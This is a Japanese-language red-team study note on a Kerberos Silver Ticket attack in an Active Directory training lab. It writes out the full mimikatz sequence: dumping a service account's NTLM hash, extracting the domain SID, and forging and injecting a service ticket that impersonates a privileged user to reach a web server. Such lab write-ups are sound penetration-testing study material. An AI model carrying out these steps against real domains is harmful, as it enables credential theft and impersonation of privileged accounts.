---
title: Silver Ticket
parent: Active Directory
grand_parent: Red Team
---

## 攻撃の概要

### シルバーチケットを作成するには、次の 3 つの情報を収集する必要がある
- SPNパスワードハッシュ
- ドメインSID
- ターゲットSPN

この例では、 iis_serviceユーザーがCLIENT75でセッションを確立していることがわかっているものとします。
## 現在のユーザがWebサイトにアクセスできるかの確認

```powershell
iwr -UseDefaultCredentials http://web04
```

```
iwr : Server Error
401 - Unauthorized: Access is denied due to invalid credentials.
```

## 1. SPN パスワード ハッシュ ( iis_serviceの NTLM ハッシュ) を取得

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
![](../../../assets/images/Pasted%20image%2020260502090042.png)
```
4d28cf5252d39971419580a51484ca09
```

## 2. ドメインSIDを取得
```powershell
whoami /user
```
![](../../../assets/images/Pasted%20image%2020260502090051.png)
```
S-1-5-21-1987370270-658905905-1781884369-1105
```
末尾4桁(1105)はユーザSIDのため、この攻撃ではS-1〜4369まで（ドメインSID）が必要となる

## 3. ターゲットSID
```
web04.corp.com
```

# チケットの作成
mimikatzコンソール上で実行
```powershell
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
- kerberos::golden 偽造サービスチケット作成。このモジュールは、ゴールデンチケットとシルバーチケットの両方を作成する機能を提供する。
- /sid ドメインSID
- /domain: ドメイン名
- /target: SPNが実行されるターゲット 
- /service: SPNプロトコル 
- /rc4: SPNのNTLMハッシュ
- /ptt コマンドを実行するマシンのメモリに偽造チケットを挿入するためのオプション
- /user: 既存のドメインユーザーを入力。このユーザーは偽造チケットに設定されます。この例では jeffadminを使用しますが、権限とグループは自分で設定できるため、他のドメインユーザーでも構いません。
![](11_Active_Directory/02_AD認証への攻撃/assets/images/Pasted%20image%2020250818225319.png)
Group IDを確認すると強力なグループのメンバーに偽装されていることがわかる

# メモリ上のチケットを確認
```powershell
klist
```
![](../../../assets/images/Pasted%20image%2020260502090846.png)

# 現在のユーザがWebサイトにアクセスできるかの再確認
```powershell
iwr -UseDefaultCredentials http://web04
```
![](../../../assets/images/Pasted%20image%2020260502090854.png)

## Lab
```powershell
(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"
```
これをしないとエラーでフラグが見れなかった。フラグはコメントアウトに隠されていたため、.contentで取得しないと勝手に棄てられていた。